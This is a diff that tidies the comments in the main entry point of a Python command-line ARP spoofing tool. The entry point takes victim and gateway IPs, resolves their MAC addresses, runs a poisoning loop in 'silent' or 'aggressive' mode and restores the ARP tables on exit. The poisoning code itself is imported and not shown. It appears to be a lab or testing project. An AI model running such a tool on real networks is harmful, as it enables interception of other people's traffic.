@@ -5,11 +5,9 @@ import os
 from .arp_utils import get_mac, restore
 from .arp_modes import poison_loop
 
-# ================================
-# Main Program Entry Point
-# ================================
+
 def main():
-    # --- Command-line Interface ---
+    # Command-line Interface
     parser = argparse.ArgumentParser(description="Multi-Host ARP Spoofing Tool with Operational Modes")
     parser.add_argument("--victims", nargs="+", required=True, help="List of victim IPs")
     parser.add_argument("--gateway", required=True, help="IP of the gateway or middle host")
@@ -24,7 +22,7 @@ def main():
     gateway_ip = args.gateway
     victim_ips = args.victims
 
-    # --- Get MAC Addresses of M1,M2 for testing puposes---
+    # Get MAC Addresses of M1,M2 for testing puposes
     if args.manual:
         print("[*] Using hardcoded MAC addresses (manual mode).")
         hardcoded_victims = {
@@ -39,12 +37,12 @@ def main():
         mac_gateway = get_mac(gateway_ip, iface)
         victim_macs = {ip: get_mac(ip, iface) for ip in victim_ips}
 
-    # --- Display Results ---
+    # Display Results
     print(f"[+] Gateway MAC: {mac_gateway}")
     for ip, mac in victim_macs.items():
         print(f"[+] Victim {ip} MAC: {mac}")
 
-    # --- Ctrl+C restores ARP tables ---
+    # Ctrl+C restores ARP tables
     def stop(sig, frame):
         print("\n[!] Ctrl+C detected — restoring ARP tables...")
         for ip, mac in victim_macs.items():
@@ -55,14 +53,13 @@ def main():
 
     signal.signal(signal.SIGINT, stop)
 
-    # --- ARP Spoofing Loop ---
+    # ARP Spoofing Loop
     print(f"Starting ARP spoofing in '{args.mode}' mode. Press Ctrl+C to stop.")
     sleep_time = {"silent": 10.0, "aggressive": 0.5}.get(args.mode, args.sleep)
     poison_loop(victim_macs, gateway_ip, mac_gateway, iface, sleep_time)
 
-# ================================
 # Run If Executed as Script
-# ================================
+
 if __name__ == "__main__":
     if os.geteuid() != 0:
         print("Please run this script as root (sudo).")
